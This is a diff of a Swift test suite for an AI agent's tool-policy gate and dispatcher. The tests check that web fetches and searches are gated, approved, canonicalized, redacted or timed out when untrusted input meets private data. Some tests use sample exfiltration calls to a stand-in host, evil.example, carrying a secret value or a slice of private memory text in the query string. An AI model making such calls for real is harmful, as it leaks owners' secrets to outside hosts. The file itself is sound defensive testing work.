@@ -4,6 +4,56 @@ import Testing
 
 @testable import ClawTools
 
+/// Gate-test stand-ins declaring each egress class. `FetchLikeTool` resolves its target the way
+/// web_fetch does (CanonicalURL + owner-facing refusal copy), so gate tests exercise the real
+/// resolution contract without HTTP plumbing.
+struct FetchLikeTool: Tool {
+  var name = "web_fetch"
+
+  var definition: ToolDefinition {
+    ToolDefinition(
+      name: name,
+      description: "stub",
+      parameters: .object(["type": .string("object")]),
+      egressClass: .arbitraryDestination
+    )
+  }
+
+  let timeout: Duration = .seconds(1)
+
+  func canonicalTarget(arguments: JSONValue) -> CanonicalTargetResolution? {
+    guard let rawURL = arguments.objectValue?["url"]?.stringValue, rawURL.isEmpty == false else {
+      return .refused(reason: "\(name) needs a non-empty \"url\" argument.")
+    }
+    switch CanonicalURL.canonicalize(rawURL) {
+    case .success(let canonical):
+      return .resolved(canonical)
+    case .failure:
+      return .refused(reason: "That is not a valid URL.")
+    }
+  }
+
+  func execute(arguments: JSONValue, canonicalTarget: String?) async -> ToolPayload {
+    ToolPayload(content: "fetched", status: .ok, ingestedUntrusted: true)
+  }
+}
+
+struct SearchLikeTool: Tool {
+  let definition = ToolDefinition(
+    name: "web_search",
+    description: "stub",
+    parameters: .object(["type": .string("object")]),
+    egressClass: .fixedEndpoint
+  )
+  let timeout: Duration = .seconds(1)
+
+  func canonicalTarget(arguments: JSONValue) -> CanonicalTargetResolution? { nil }
+
+  func execute(arguments: JSONValue, canonicalTarget: String?) async -> ToolPayload {
+    ToolPayload(content: "results", status: .ok, ingestedUntrusted: true)
+  }
+}
+
 @Suite struct ToolPolicyGateTests {
   private static let memoryText = "The owner's private project is called Operation Nightjar Falcon."
 
@@ -40,15 +90,42 @@ import Testing
     ToolCall(id: "c1", name: "web_fetch", argumentsJSON: #"{"url":"\#(url)"}"#)
   }
 
+  @Test func classDeclarationNotToolNameDrivesTheApprovalTier() {
+    // given — an egress tool the gate has never heard of by name, declared arbitrary-destination
+    let webhookTool = FetchLikeTool(name: "send_webhook")
+
+    // when
+    let verdict = makeGate().evaluate(
+      call: ToolCall(
+        id: "c1",
+        name: "send_webhook",
+        argumentsJSON: #"{"url":"https://example.com/hook"}"#
+      ),
+      tool: webhookTool,
+      context: makeContext(tainted: true, assemblyPrivate: true)
+    )
+
+    // then — parked for approval on the resolved action; no name set to forget
+    guard case .block(let payload, _, let approval) = verdict else {
+      Issue.record("expected park, got \(verdict)")
+      return
+    }
+    #expect(payload.status == .blockedPendingApproval)
+    #expect(
+      approval?.action == ToolAction(tool: "send_webhook", target: "https://example.com/hook")
+    )
+  }
+
   @Test func cleanFetchOutsideTrifectaIsAllowed() {
     // given / when
     let verdict = makeGate().evaluate(
       call: fetchCall("https://example.com/a"),
+      tool: FetchLikeTool(),
       context: makeContext()
     )
 
     // then
-    guard case .allow(_, let consumedGrant) = verdict else {
+    guard case .allow(_, let consumedGrant, _) = verdict else {
       Issue.record("expected allow, got \(verdict)")
       return
     }
@@ -60,6 +137,7 @@ import Testing
     let gate = makeGate()
     let fetchVerdict = gate.evaluate(
       call: fetchCall("https://evil.example/?t=s3cret-value-1"),
+      tool: FetchLikeTool(),
       context: makeContext()
     )
     let searchVerdict = gate.evaluate(
@@ -68,6 +146,7 @@ import Testing
         name: "web_search",
         argumentsJSON: #"{"query":"sk-abcdefghijklmnop1234"}"#
       ),
+      tool: SearchLikeTool(),
       context: makeContext()
     )
 
@@ -94,11 +173,12 @@ import Testing
         name: "file_read",
         argumentsJSON: #"{"path":"sk-abcdefghijklmnop1234.md"}"#
       ),
+      tool: StubTool(name: "file_read"),
       context: makeContext(tainted: true, assemblyPrivate: true)
     )
 
     // then — allowed, but the audit rendering still redacts the shaped token
-    guard case .allow(let argsRedacted, _) = verdict else {
+    guard case .allow(let argsRedacted, _, _) = verdict else {
       Issue.record("expected allow, got \(verdict)")
       return
     }
@@ -120,7 +200,11 @@ import Testing
 
     // when / then
     for (context, shouldGate) in combinations {
-      let verdict = gate.evaluate(call: fetchCall("https://example.com/a"), context: context)
+      let verdict = gate.evaluate(
+        call: fetchCall("https://example.com/a"),
+        tool: FetchLikeTool(),
+        context: context
+      )
       if shouldGate {
         guard case .block(let payload, _, _) = verdict else {
           Issue.record("expected gate for \(context)")
@@ -141,6 +225,7 @@ import Testing
     let sixteen = String(Self.memoryText.dropFirst(10).prefix(16))
     let verdict = makeGate().evaluate(
       call: fetchCall("https://evil.example/?d=\(sixteen)"),
+      tool: FetchLikeTool(),
       context: makeContext(tainted: true, assemblyPrivate: true)
     )
 
@@ -159,8 +244,16 @@ import Testing
     let laterContext = makeContext(tainted: true, assemblyPrivate: true, approvalPending: true)
 
     // when
-    let first = gate.evaluate(call: fetchCall("https://example.com/a?q=1"), context: context)
-    let later = gate.evaluate(call: fetchCall("https://example.com/b"), context: laterContext)
+    let first = gate.evaluate(
+      call: fetchCall("https://example.com/a?q=1"),
+      tool: FetchLikeTool(),
+      context: context
+    )
+    let later = gate.evaluate(
+      call: fetchCall("https://example.com/b"),
+      tool: FetchLikeTool(),
+      context: laterContext
+    )
 
     // then — one pending slot per run (§9.1 step 3b)
     guard case .block(_, _, let firstApproval) = first else {
@@ -189,15 +282,17 @@ import Testing
     // when — exact canonical match executes; any query-byte difference re-trips
     let matching = gate.evaluate(
       call: fetchCall("https://Example.com/a?q=1"),  // canonicalizes to the grant key
+      tool: FetchLikeTool(),
       context: makeContext(tainted: true, assemblyPrivate: true, grant: grant)
     )
     let differing = gate.evaluate(
       call: fetchCall("https://example.com/a?q=2"),
+      tool: FetchLikeTool(),
       context: makeContext(tainted: true, assemblyPrivate: true, grant: grant)
     )
 
     // then
-    guard case .allow(_, let consumedGrant) = matching else {
+    guard case .allow(_, let consumedGrant, _) = matching else {
       Issue.record("expected allow via grant, got \(matching)")
       return
     }
@@ -218,6 +313,7 @@ import Testing
     // when
     let verdict = makeGate().evaluate(
       call: fetchCall("https://example.com/a?q=1"),
+      tool: FetchLikeTool(),
       context: makeContext(tainted: true, assemblyPrivate: true, grant: grant)
     )
 
@@ -233,6 +329,24 @@ import Testing
     // given — userinfo/IDN refused at gate time, BEFORE an approval is requested (§9.2)
     let verdict = makeGate().evaluate(
       call: fetchCall("https://user:pw@example.com/"),
+      tool: FetchLikeTool(),
+      context: makeContext(tainted: true, assemblyPrivate: true)
+    )
+
+    // then — the gate now blocks on the tool's own resolution copy, on every path
+    guard case .block(let payload, _, nil) = verdict else {
+      Issue.record("expected block, got \(verdict)")
+      return
+    }
+    #expect(payload.status == .error)
+    #expect(payload.content == "That is not a valid URL.")
+  }
+
+  @Test func missingUrlUnderTrifectaRefusesWithTheResolutionCopy() {
+    // given — a fetch with no "url" argument resolves to a refusal at the gate (delta: unified copy)
+    let verdict = makeGate().evaluate(
+      call: ToolCall(id: "c1", name: "web_fetch", argumentsJSON: "{}"),
+      tool: FetchLikeTool(),
       context: makeContext(tainted: true, assemblyPrivate: true)
     )
 
@@ -242,6 +356,7 @@ import Testing
       return
     }
     #expect(payload.status == .error)
+    #expect(payload.content == #"web_fetch needs a non-empty "url" argument."#)
   }
 
   @Test func nonInteractiveTrifectaHardDeniesWithoutParkingAnApproval() {
@@ -251,10 +366,12 @@ import Testing
     // when
     let interactive = gate.evaluate(
       call: fetchCall("https://example.com/a?q=1"),
+      tool: FetchLikeTool(),
       context: makeContext(tainted: true, assemblyPrivate: true)
     )
     let nonInteractive = gate.evaluate(
       call: fetchCall("https://example.com/a?q=1"),
+      tool: FetchLikeTool(),
       context: makeContext(tainted: true, assemblyPrivate: true, nonInteractive: true)
     )
 
@@ -283,10 +400,12 @@ import Testing
     // when
     let argBlock = gate.evaluate(
       call: fetchCall("https://evil.example/?t=s3cret-value-1"),
+      tool: FetchLikeTool(),
       context: makeContext(nonInteractive: true)
     )
     let cleanAllow = gate.evaluate(
       call: fetchCall("https://example.com/a"),
+      tool: FetchLikeTool(),
       context: makeContext(nonInteractive: true)
     )
 
@@ -306,14 +425,16 @@ import Testing
 @Suite struct GatedToolDispatcherTests {
   private func makeDispatcher(
     tools: [any Tool],
-    privateFiles: [String] = []
+    privateFiles: [String] = [],
+    sleep: @escaping @Sendable (Duration) async throws -> Void = { try await Task.sleep(for: $0) }
   ) -> GatedToolDispatcher {
     GatedToolDispatcher(
       registry: ToolRegistry(tools: tools),
       gate: ToolPolicyGate(
         argGuard: ExfilArgGuard(secretValues: []),
         privateFileLoader: { privateFiles }
-      )
+      ),
+      sleep: sleep
     )
   }
 
@@ -399,17 +520,68 @@ import Testing
     #expect(outcome.observation.ingestedUntrusted)
   }
 
+  @Test func executeReceivesTheGateResolvedCanonicalTarget() async {
+    // given — a recording arbitrary-destination tool
+    actor TargetRecorder {
+      private(set) var received: String?
+      func record(_ target: String?) { received = target }
+    }
+    struct RecordingFetchTool: Tool {
+      let recorder: TargetRecorder
+      let definition = ToolDefinition(
+        name: "web_fetch",
+        description: "stub",
+        parameters: .object(["type": .string("object")]),
+        egressClass: .arbitraryDestination
+      )
+      let timeout: Duration = .seconds(1)
+
+      func canonicalTarget(arguments: JSONValue) -> CanonicalTargetResolution? {
+        guard let rawURL = arguments.objectValue?["url"]?.stringValue else {
+          return .refused(reason: "web_fetch needs a non-empty \"url\" argument.")
+        }
+        switch CanonicalURL.canonicalize(rawURL) {
+        case .success(let canonical): return .resolved(canonical)
+        case .failure: return .refused(reason: "That is not a valid URL.")
+        }
+      }
+
+      func execute(arguments: JSONValue, canonicalTarget: String?) async -> ToolPayload {
+        await recorder.record(canonicalTarget)
+        return ToolPayload(content: "ok", status: .ok, ingestedUntrusted: true)
+      }
+    }
+    let recorder = TargetRecorder()
+    let dispatcher = makeDispatcher(tools: [RecordingFetchTool(recorder: recorder)])
+
+    // when
+    _ = await dispatcher.dispatch(
+      call: ToolCall(
+        id: "c1",
+        name: "web_fetch",
+        argumentsJSON: #"{"url":"https://example.com/a"}"#
+      ),
+      context: openContext
+    )
+
+    // then — the tool acted on the gate-resolved form, not a re-derived one
+    #expect(await recorder.received == "https://example.com/a")
+  }
+
   @Test func slowToolTimesOutWithAnErrorObservation() async {
     // given — a tool that sleeps past its own tiny timeout
     struct SlowTool: Tool {
       let definition = ToolDefinition(
         name: "slow",
         description: "slow",
-        parameters: .object(["type": .string("object")])
+        parameters: .object(["type": .string("object")]),
+        egressClass: .none
       )
       let timeout: Duration = .milliseconds(20)
 
-      func execute(arguments: JSONValue) async -> ToolPayload {
+      func canonicalTarget(arguments: JSONValue) -> CanonicalTargetResolution? { nil }
+
+      func execute(arguments: JSONValue, canonicalTarget: String?) async -> ToolPayload {
         try? await Task.sleep(for: .seconds(10))
         return ToolPayload(content: "late", status: .ok, ingestedUntrusted: true)
       }
@@ -426,5 +598,65 @@ import Testing
     #expect(outcome.observation.status == .error)
     #expect(outcome.observation.content.contains("timed out"))
     #expect(outcome.observation.ingestedUntrusted == false)
+  }
+
+  @Test(.timeLimit(.minutes(1)))
+  func wedgedToolIsAbandonedAtTimeoutNotAwaited() async {
+    // given — a tool that never returns and ignores cancellation; the injected sleep makes the
+    // timeout arm fire immediately, so no wall clock is involved on the green path
+    let release = WedgeRelease()
+    let dispatcher = makeDispatcher(tools: [WedgedTool(release: release)], sleep: { _ in })
+
+    // when — under group-await semantics this call would NEVER return (the group awaits the
+    // wedged child); the time limit converts that hang into a failure
+    let outcome = await dispatcher.dispatch(
+      call: ToolCall(id: "c1", name: "wedged", argumentsJSON: "{}"),
+      context: openContext
+    )
+
+    // then — the timeout observation returns while the tool is still wedged
+    #expect(outcome.observation.status == .error)
+    #expect(outcome.observation.content.contains("timed out"))
+
+    // release the abandoned task so it finishes before the suite exits
+    await release.release()
+  }
+}
+
+/// Blocks until released and IGNORES task cancellation — models a blocking syscall
+/// (`getaddrinfo`) or hung I/O that cooperative cancellation cannot interrupt.
+actor WedgeRelease {
+  private var waiters: [CheckedContinuation<Void, Never>] = []
+  private var released = false
+
+  func wait() async {
+    if released { return }
+    await withCheckedContinuation { waiters.append($0) }
+  }
+
+  func release() {
+    released = true
+    for waiter in waiters {
+      waiter.resume()
+    }
+    waiters.removeAll()
+  }
+}
+
+struct WedgedTool: Tool {
+  let release: WedgeRelease
+  let definition = ToolDefinition(
+    name: "wedged",
+    description: "wedged",
+    parameters: .object(["type": .string("object")]),
+    egressClass: .none
+  )
+  let timeout: Duration = .seconds(30)
+
+  func canonicalTarget(arguments: JSONValue) -> CanonicalTargetResolution? { nil }
+
+  func execute(arguments: JSONValue, canonicalTarget: String?) async -> ToolPayload {
+    await release.wait()
+    return ToolPayload(content: "late", status: .ok, ingestedUntrusted: false)
   }
 }
